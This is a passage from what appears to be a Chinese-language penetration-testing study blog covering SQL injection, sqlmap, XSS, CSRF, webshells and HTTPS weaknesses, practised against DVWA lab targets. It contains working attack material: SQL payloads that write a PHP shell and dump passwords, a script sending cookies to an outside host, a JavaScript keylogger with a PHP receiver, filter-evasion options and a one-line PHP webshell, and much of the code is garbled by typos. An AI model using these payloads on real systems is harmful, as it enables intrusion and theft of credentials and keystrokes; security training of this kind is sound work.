class="line">Mysql账号</span><br><span class="line">	cat php-revers-shell.php | xxd -PS | tr-d ^\n'</span><br><span class="line">	' union select null, (0x3c3f706870) INTO DUMPFILE '/tmp/x.php'--</span><br><span class="line">保存下载数据库</span><br><span class="line">	' union select null, concat(user,0x3a,password) from users INTOOUTFILE</span><br><span class="line">	'/tmp/a.db-</span><br></pre></td></tr></table></figure><h4 id="SQL盲注"><a href="#SQL盲注" class="headerlink" title="SQL盲注"></a>SQL盲注</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">不显示数据库内建的报错信息</span><br><span class="line">	内建的报错信息帮助开发人员发现和修复问题</span><br><span class="line">	报错信息提供关于系统的大量有用信息</span><br><span class="line">当程序员隐藏了数据库内建报错信息，替换为通用的错误提示，sql注入将无法依据报错信息判断注入语句的执行结果，即盲注</span><br><span class="line">思路:既然无法基于报错信息判断结果，基于逻辑真假的不同结果来判断</span><br><span class="line">    1' and 1=1--+</span><br><span class="line">    1' and 1=2--+</span><br></pre></td></tr></table></figure><h4 id="SQLMAP自动注入"><a href="#SQLMAP自动注入" class="headerlink" title="SQLMAP自动注入"></a>SQLMAP自动注入</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">开源sq|注入漏洞检测、利用工具</span><br><span class="line">检测动态页面中get/post参数、cookie、 http头</span><br><span class="line">数据榨取</span><br><span class="line">文件系统访问</span><br><span class="line">操作系统命令执行</span><br><span class="line">引擎强大、特性丰富</span><br><span class="line">Xss漏洞检测</span><br><span class="line">五种漏洞检测技术</span><br><span class="line">    基于布尔的盲注检测</span><br><span class="line">    基于时间的盲注检测</span><br><span class="line">		'and (select * from (selectseel(0)))a)-+</span><br><span class="line">	基于错误的检测</span><br><span class="line">	基于UNION联合查询的检测</span><br><span class="line">	适用于通过for循环直接输出联合查询结果，否则只显示第-项结果</span><br><span class="line">	基于堆叠查询的检测</span><br><span class="line">		堆叠多个查询语句</span><br><span class="line">		适用于非select的数据修改、删除的操作</span><br><span class="line">	支持的数据库管理系统DBMS</span><br><span class="line">		MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, 			IBM DB2, sQLite,Firebird, Sybase，SAP MaxDB</span><br><span class="line">Get方法</span><br><span class="line">	sqlmap -U "http://192.1 68.20.10/mutillidae/index.php?page=user-</span><br><span class="line">	info.php&amp;username= 1 1 &amp;password=22&amp;user-info-php-submit-		button=View+Account+Details" -P username -f</span><br><span class="line">扫描URL列表文件</span><br><span class="line">	http://1.1.1.1/vuIn1 .php?q=foobar</span><br><span class="line">	http://1.1.1.1/vuln3/id/1*</span><br><span class="line">	sqlmap. -m list.txt</span><br><span class="line">扫描google搜索结果</span><br><span class="line">	sqlmap.py -g "inud:\".php?id=1\"</span><br><span class="line">POST方法</span><br><span class="line">	使用http请求文件(burpsuite )</span><br><span class="line">		sqlmap 1 request.txt</span><br><span class="line">	使用burpsuite log文件</span><br><span class="line">		sqlmap 1 log.txt</span><br><span class="line">HTTPS</span><br><span class="line">	sqlmap -U "https://1.1.1.1 /a,php?id= 1:8843" --force-ss</span><br><span class="line">扫描配置文件</span><br><span class="line">	sqlmap -C sqlmap.conf</span><br><span class="line">数据段:  --data</span><br><span class="line">	get / post都适用</span><br><span class="line">	sqlmap -U "http://1.1.1.1/a.php" -data="user= l&amp;pass=2" -f</span><br><span class="line">变量分隔符: -param-del</span><br><span class="line">	http://1.1.1.l/a.php?q=foo;id=1 // ;  &amp;</span><br><span class="line">	sqlmap -U "http://1.1.1.1 /a.php" -data="q=foo;id=1" -param-del="," -f</span><br><span class="line">cookie头:  --cookie</span><br><span class="line">	web应用需要基于cookie的身份认证</span><br><span class="line"><span class="meta">	#</span><span class="bash">检查cookie中的注入点(sqlmap自动测试),需要--level = 2级才会检测</span></span><br><span class="line">	Set-Cookie / -drop-set-cookie</span><br><span class="line">-user-agent：</span><br><span class="line">	sqlmap/1.0-dex-0xxxx (http://sqlmap.org)</span><br><span class="line">--random-agent #sqlmap的useragent很容易被服务器过滤掉，因此需要伪造成浏览器的</span><br><span class="line">	/usr/share/sqlmap/txt/user-agents.txt</span><br><span class="line">sqlmap检查user-agent中的注入点: #Level&gt;= 3</span><br><span class="line">APP/WAF/IPS/IDS过滤异常user-agent时报错</span><br><span class="line">    [hh:mm:20] [ERROR] the target URL responded with an unknown HTTP</span><br><span class="line">    status code, try to force the HTTP User-Agent header with option ser</span><br><span class="line">    agent or --random-agent</span><br><span class="line">Host头: --host</span><br><span class="line"><span class="meta">	#</span><span class="bash">Level =5</span></span><br><span class="line">Referer头: -referrer</span><br><span class="line"><span class="meta">	#</span><span class="bash">Level &gt;=3</span></span><br><span class="line">额外的header: --headers</span><br><span class="line">	每个头单独一行(名称区分大小写)</span><br><span class="line">	sqlmap. -∪"http://l.1.1.1/a.php?id=1" -</span><br><span class="line">	headers=' "host:www.a.com\nUser-Agent:yuanfh"</span><br><span class="line">--method=GET/POST</span><br><span class="line">--skip-urlencode</span><br><span class="line">    默认Get方法会对传输内容进行编码，某些WEB服务器不遵守RFC标准编码，使</span><br><span class="line">    用原始字符提交数据</span><br><span class="line">--keep-alive</span><br><span class="line">    使用http(s)长连接，性能好</span><br><span class="line">    与--proxy参数不兼容</span><br><span class="line">    长连接避免重复建立连接的网络开销，但大量长连接会严重占用服务器资源</span><br><span class="line">--tamper</span><br><span class="line">    混淆脚本，用于绕过应用层过滤、IPS、 WAF</span><br><span class="line">    sqlmap -U "http://1.1.1.1/a.php?id=1" --</span><br><span class="line">    tamper=" tamper/between.py.tamper/randomcase.py.tamper/space2c</span><br><span class="line">    omment.py"-v 3</span><br><span class="line">    </span><br><span class="line">Mysql&lt; 5.0 ,没有information schema 库</span><br><span class="line"><span class="meta">Mysql&gt;</span><span class="bash">= 5.0，但无权读取information. schema库</span></span><br><span class="line">微软的access数据库，</span><br><span class="line">默认无权读取MSysObjects库</span><br><span class="line">--common-tables	#对数据库表进行暴力破解（跑字典）</span><br><span class="line">--common-columns #暴力破解数据库列</span><br><span class="line">				(Access系统表无列信息)</span><br></pre></td></tr></table></figure><h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><blockquote><p>XSS攻击分为反射型，DOM型和持久型，持久性是注入到目标服务器，反射型是引诱用户点击跨站脚本；基于DOM型的XSS是不需要与服务器端交互的,它只发生在客户端处理数据阶段。</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">攻击WEB客户端</span><br><span class="line">客户端脚本语言</span><br><span class="line">    弹窗告警、广告</span><br><span class="line">    Javascript</span><br><span class="line">    在浏览器中执行</span><br><span class="line">XSS (cross-site scripting)</span><br><span class="line">    通过WEB站点漏洞，向客户端交付恶意脚本代码，实现对客户端的攻击目的</span><br><span class="line">    注入客户端脚本代码</span><br><span class="line">    盗取cookie、</span><br><span class="line">    重定向</span><br><span class="line">VBScript, ActiveX, or Flash</span><br><span class="line">JavaScript</span><br><span class="line">    与Java语言无关</span><br><span class="line">    命名完全出于市场原因</span><br><span class="line">    使用最广的客户端脚本语言</span><br><span class="line">使用场景</span><br><span class="line">    直接嵌入html: <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript"> alert(<span class="string">'XSS'</span>); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    元素标签事件: <span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">alert(</span>'<span class="attr">XSS</span>')&gt;</span></span><br><span class="line">    图片标签: <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"avascript:alert('XSS');"</span>&gt;</span></span><br><span class="line">    其他标签: <span class="tag">&lt;<span class="name">iframe</span>&gt;</span>, <span class="tag">&lt;<span class="name">div</span>&gt;</span>, and <span class="tag">&lt;<span class="name">link</span>&gt;</span></span><br><span class="line">    DOM对象，篡改页面内容  </span><br><span class="line">        </span><br><span class="line">窃取cookie <span class="comment">&lt;!--通过外链引入跨站脚本--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">http://1.1.1.1/a.js</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">a.js源码</span><br><span class="line">    var img = new Image();</span><br><span class="line">    img.src = "http://1.1.1.1/cookies ,php?cookie="+ document.cookie;</span><br></pre></td></tr></table></figure><ul><li>攻击实例：<code>键盘记录</code></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#攻击代码</span><br><span class="line">#Keylogger.js</span><br><span class="line"><span class="built_in">document</span>.onkeypress = <span class="function"><span class="keyword">function</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">    evt= evt || <span class="built_in">window</span>.event</span><br><span class="line">    key = <span class="built_in">String</span>.fromCharCode(evt.charCode)</span><br><span class="line">    <span class="keyword">if</span> (key) &#123;</span><br><span class="line">        <span class="keyword">var</span> http = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        <span class="keyword">var</span> param = encodeURl(key)</span><br><span class="line">        http,open(<span class="string">"PST,"</span>http:<span class="comment">//192.1 68.20.8/keylogger.php." ,true);</span></span><br><span class="line">        http.setRequestHeader<span class="string">'"Content-type","application/x-www-form-urlencoded"),</span></span><br><span class="line"><span class="string">        http.send("key="+param);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">#接收端</span></span><br><span class="line"><span class="string">#Keylogger.php</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string">    $key=$POST['</span>key<span class="string">'];</span></span><br><span class="line"><span class="string">    $logfile="keylog.txt";</span></span><br><span class="line"><span class="string">    $fp = fopen($logfile, "a");</span></span><br><span class="line"><span class="string">    fwrite($fp, $key);</span></span><br><span class="line"><span class="string">    fclose($fp);</span></span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line"><span class="string">#引入XSS脚本到浏览器</span></span><br><span class="line"><span class="string">&lt;script src="http://1.1.1.1/keylogger.js"&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">#点击下面的页面会跳转到初始网页，并开始记录键盘</span></span><br><span class="line"><span class="string">&lt;a href="http://192.168.20.10/dvwa/vulnerabilities/xss_r/?name=&lt;script src='</span>http:<span class="comment">//192.168.20.8/keyloggerjs'&gt;&lt;/script&gt;"&gt;xss&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><h4 id="反射型XSS和Xsser工具"><a href="#反射型XSS和Xsser工具" class="headerlink" title="反射型XSS和Xsser工具"></a>反射型XSS和Xsser工具</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Xsser</span><br><span class="line">	命令行/图形化工具</span><br><span class="line">	绕过服务器端输入筛选</span><br><span class="line">		10进制/ 16进制编码</span><br><span class="line">		unescape()</span><br><span class="line">xsser -u "http://1.1.1.1/dvwa/vuInerabilities/" -g "xss_r/?name=" --cookie="security=low; PHPSESSID=d23e469411707ff8210717e67c521a81" -s</span><br><span class="line">-v --reverse-check </span><br><span class="line"><span class="meta">	#</span><span class="bash"> -u代表url，-g代表get请求， -s代表请求次数统计， -v可视化，--reverse-check连接本机测试</span></span><br><span class="line">-heuristic #检查被过滤的字符</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">对payload编码，绕过服务器端筛选过滤</span></span><br><span class="line">-Str Use method String.FromCharCode()</span><br><span class="line">-Une Use Unescape() function</span><br><span class="line">-Mix Mix String.FromCharCode() and Unescape()</span><br><span class="line">-Dec Use Decimal encoding</span><br><span class="line">-Hex Use Hexadecimal encoding</span><br><span class="line">-Hes Use Hexadecimal encoding, with semicolons</span><br><span class="line">-Dwo Encode vectors iIP addresses in DWORD</span><br><span class="line">-Doo Encode vectors IP addresses in Octal</span><br><span class="line">-Cem=CEM Try-manually- different Character Encoding Mutatiohs</span><br><span class="line">(reverse obfuscation: good) -&gt; (ex: 'Mix,Une,Str.Hex')</span><br></pre></td></tr></table></figure><blockquote><p>针对DVWA high安全级别进行XSS攻击，发现是无法攻击的</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xsser -U "http://1.1.1.1/dwwa/vuInerabilities/" -g "xss_ r/?name=" -</span><br><span class="line">cookie="security=high; PHPSESSID=d23e46941 1707f82107 17e67c521q817</span><br><span class="line">-Cem=' Mix,Une,Str.Hex'</span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># high安全级别会使用htmlspecialchars()函数会将web代码转换成字符串</span></span></span><br><span class="line">							## 例如：&lt;   &gt;   转换成  &amp;lt; &amp;gt;</span><br></pre></td></tr></table></figure><h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">存储型XSS</span><br><span class="line">    长期存储于服务器端</span><br><span class="line">    每次用户访问都会被执行javascript脚本</span><br><span class="line">Name: # 一般客户端表单会有长度限制</span><br><span class="line">	  # 可以通过客户端修改html代码或者截断代理突破限制</span><br><span class="line">&lt;script src=http:<span class="comment">//1.1.1.1/a.js&gt;&lt;/script&gt;</span></span><br><span class="line">a.js源码: </span><br><span class="line">    <span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">    img.src = <span class="string">"http://1.1.1.1:88/cookies.php?cookie="</span>+<span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure><h4 id="BEEF"><a href="#BEEF" class="headerlink" title="BEEF"></a>BEEF</h4><blockquote><p>浏览器漏洞利用框架</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">浏览器攻击面</span><br><span class="line">    应用普遍转移到B / S架构，浏览器成为统一客户端程序</span><br><span class="line">    结合社会，工程学方法对浏览器进行攻击</span><br><span class="line">    攻击浏览器用户</span><br><span class="line">    通过注，入的JS脚本，利用浏览器攻击其他网站</span><br><span class="line">BeEF (Browser exploitation framework )</span><br><span class="line">    生成、交付payload</span><br><span class="line">    Ruby语言编写</span><br><span class="line">    服务器端:管理hooked客户端</span><br><span class="line">    客户端:运行于客户端浏览器的Javascript脚本(hook )</span><br></pre></td></tr></table></figure><h4 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Cross site request forgery #跨站请求伪造</span><br><span class="line">与XSS经常混淆</span><br><span class="line">从信任的角度来区分</span><br><span class="line">    XSS:利用用户对站点的信任</span><br><span class="line">    CSRF:利用站点对已经身份认证的信任</span><br><span class="line">结合社工在身份认证会话过程中实现攻击</span><br><span class="line">    修改账号密码、个人信息(email、 收货地址)</span><br><span class="line">    发送伪造的业务请求(网银、购物、投票)</span><br><span class="line">    关注他人社交账号、推送博文</span><br><span class="line">    在用户非自愿、不知情的情况下提交请求</span><br><span class="line"># DVWA低安全级别不会对修改密码过程进行确认验证</span><br><span class="line"># 中安全级别会检测请求的跳转来源（refer字段）</span><br><span class="line"># 高安全级别会首先验证旧密码</span><br><span class="line"># burpsuite能够根据get请求自动生产对应的CSRF post请求</span><br><span class="line">防御对策：</span><br><span class="line">    在请求和响应过程中检查是否存在anti-CSRF token名</span><br><span class="line">    检查服务器是否验证anti-CSRF token的名值</span><br><span class="line">    检查token中可编辑的字符串</span><br><span class="line">    检查referrer头是否可以伪造</span><br><span class="line">    Captcha</span><br><span class="line">    anti-CSRF token</span><br><span class="line">    Referrer头</span><br><span class="line">    降低会话超时时间</span><br></pre></td></tr></table></figure><h4 id="WEBSHELL"><a href="#WEBSHELL" class="headerlink" title="WEBSHELL"></a>WEBSHELL</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo shell exec($_ GET['cmd']);?&gt; #一句话shell</span><br><span class="line">中国菜刀: http://www.maicaidao.co/</span><br><span class="line">可能被IDS、AV、WAF、扫描器软件发现查杀</span><br><span class="line">WeBaCoo (Web Backdoor Cookie)</span><br><span class="line">    类终端的shell</span><br><span class="line">    编码通信内容通过cookie头传输，隐蔽性较强</span><br><span class="line">    cm:base64编码的命令</span><br><span class="line">    cn:服务器用于返回数据的cookie头的名</span><br><span class="line">    cp:返回信息定界符</span><br><span class="line">生成服务端</span><br><span class="line">	webacoo -g -o a.php</span><br><span class="line">客户端连接</span><br><span class="line">	webacoo -t -U http://1.1.1.1/a.php</span><br><span class="line">Weevely:</span><br><span class="line">    隐蔽的类终端PHP Webshell</span><br><span class="line">    30多个管理模块</span><br><span class="line">    执行系统命令、浏览文件系统</span><br><span class="line">    检查服务器常见配置错误</span><br><span class="line">    创建正向、反向TCP Shell连接</span><br><span class="line">    通过目标计算机代理HTTP流量</span><br><span class="line">    从目标计算机运行端C ]扫描，渗透内网</span><br><span class="line">	支持连接密码</span><br></pre></td></tr></table></figure><blockquote><p>上面的工具在新版本kali已经不再提供；最新的webshell检测工具可以参照：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20veGlhb3ppL3AvMTI2Nzk3NzcuaHRtbA==">https://www.cnblogs.com/xiaozi/p/12679777.html<i class="fa fa-external-link-alt"></i></span></p></blockquote><h3 id="HTTPS攻击"><a href="#HTTPS攻击" class="headerlink" title="HTTPS攻击"></a>HTTPS攻击</h3><blockquote><p>HTTPS存在多种实现的协议</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">全站HTTPS正成为潮流趋势</span><br><span class="line">	淘宝、百度</span><br><span class="line">HTTPS的作用</span><br><span class="line">	CIA</span><br><span class="line">	解决的是信息传输过程中数据被篡改、窃取</span><br><span class="line">	加密:对称、非对称、单向</span><br><span class="line">HTTPS攻击方法</span><br><span class="line">    降级攻击</span><br><span class="line">    解密攻击(明文、证书伪造)</span><br><span class="line">    协议漏洞、实现方法的漏洞、配置不严格</span><br><span class="line">Secure socket layer #安全套接字协议</span><br><span class="line">    保证网络通信安全的加密协议</span><br><span class="line">    <span class="number">1994</span>年由Netscape开发成为统一标准</span><br><span class="line">    <span class="number">1999</span>年TLS(transport layer security)取代SSLv3</span><br><span class="line">    近年来发现的SSL协议漏洞使业界认为其漏洞已不可软件修复</span><br><span class="line">        Heartbleed</span><br><span class="line">        POODLE</span><br><span class="line">        BEAST</span><br><span class="line">TLS当前最新版本1.2 #传输层安全协议</span><br><span class="line">TLS/SSL、HTTPS、 HTTP over SSL通俗上表示同意含义</span><br><span class="line">非对称加密算法 #一般用来加密交换密钥</span><br><span class="line">    Diffie Hellman key exchange</span><br><span class="line">    Rivest Shamir Adleman (RSA)</span><br><span class="line">    lliptic Curve Cryptography (ECC)</span><br><span class="line">对称加密算法</span><br><span class="line">    Data Encryption Standard (DES) / <span class="number">3</span>DES</span><br><span class="line">    Advance Encryption Standard (AES) #主流</span><br><span class="line">    International Data Encryption Algorithm (IDEA)</span><br><span class="line">    Rivest Cipher <span class="number">4</span> (RC4)</span><br><span class="line">    	WEP、TLS/SSL、 RDP、 Secure shell</span><br><span class="line">单向加密算法(HASH)</span><br><span class="line">    HASH算法		HASH值长度(bit)</span><br><span class="line">-------------------------------------</span><br><span class="line">    MD5				<span class="number">128</span></span><br><span class="line">    SHA<span class="number">-1</span>			<span class="number">160</span></span><br><span class="line">    SHA<span class="number">-2</span>			<span class="number">224</span>、<span class="number">256</span>、 <span class="number">384</span>、<span class="number">512</span></span><br><span class="line">--------------------------------------</span><br><span class="line">SHA<span class="number">-3</span>已经设计完成，但尚末广泛使用</span><br><span class="line">SHA<span class="number">-2</span>是TLS <span class="number">1.2</span> 唯一支持的单向加密算法</span><br><span class="line">碰撞攻击针对单向加密算法</span><br><span class="line">	两个不同的文件生成相同的HASH值</span><br><span class="line">SSL的弱点</span><br><span class="line">	SSL是不同的对称、非对称、单向加密算法的组合加密实现(cipher suite)</span><br><span class="line">加密算法					SSL实现中的用途</span><br><span class="line">--------------------------------------------------------</span><br><span class="line">RAS / Diffie-Hellman		密钥交换、身份认证</span><br><span class="line">AES							加密数据，由RAS/DH完成密钥交换</span><br><span class="line">HMAC-SHA2					摘要信息</span><br><span class="line">--------------------------------------------------------                       </span><br><span class="line">    服务器端为提供更好的兼容性，选择支持大量过时cipher suite</span><br><span class="line">	协商过程中强迫降级加密强度</span><br><span class="line">	现代处理器计算能力可以在可接受的时间内破解过时加密算法</span><br><span class="line">	购买云计算资源破解</span><br></pre></td></tr></table></figure><h4 id="OpenSSL"><a href="#OpenSSL" class="headerlink" title="OpenSSL"></a>OpenSSL</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Openssl</span><br><span class="line">    直接调用openssl库识别目标服务器支持的SSL/TLS cipher suite</span><br><span class="line">    openssl S_ client -connect www.baudu.com:443</span><br><span class="line">    openssl s_ client -tls1_2 -cipher 'ECDH-RSA-RC4 SHA' -connect</span><br><span class="line">    www.taobao.com:443</span><br><span class="line">		密钥交换-身份认证-数据加密-HASH算法</span><br><span class="line">	openssls_ client -tls1_ 2 -cipher "NULL, EXPORT,LOW,DES" -connect</span><br><span class="line">	www.taobao.com:443 (协商低安全级别cipher suite)</span><br><span class="line">	可被破解的cipher suite</span><br><span class="line">	openssI ciphers -V "NULL, EXPORT,LOW,DES"</span><br><span class="line">https://www. openssl.org/docs/ apps/ciphers.html</span><br></pre></td></tr></table></figure><h4 id="SSLyze"><a href="#SSLyze" class="headerlink" title="SSLyze"></a>SSLyze</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SSLyze</span><br><span class="line">    Python语言编写</span><br><span class="line">    检查SSL过时版本</span><br><span class="line">    检查存在弱点的cipher suite</span><br><span class="line">    扫描多站点时，支持来源文件</span><br><span class="line">    检查是否支持会话恢复</span><br><span class="line">    sslyze --regular www.taobao.com:443</span><br><span class="line">Nmap</span><br><span class="line">	nmap --script=ssl-enum-ciphers.nse www.taobao.com</span><br><span class="line"><span class="meta">#</span><span class="bash"> ssl查询网站 https://www.sllabs.com/ssltest/</span></span><br></pre></td></tr></table></figure><h4 id="SSL-TLS中间人攻击"><a href="#SSL-TLS中间人攻击" class="headerlink" title="SSL/TLS中间人攻击"></a>SSL/TLS中间人攻击</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 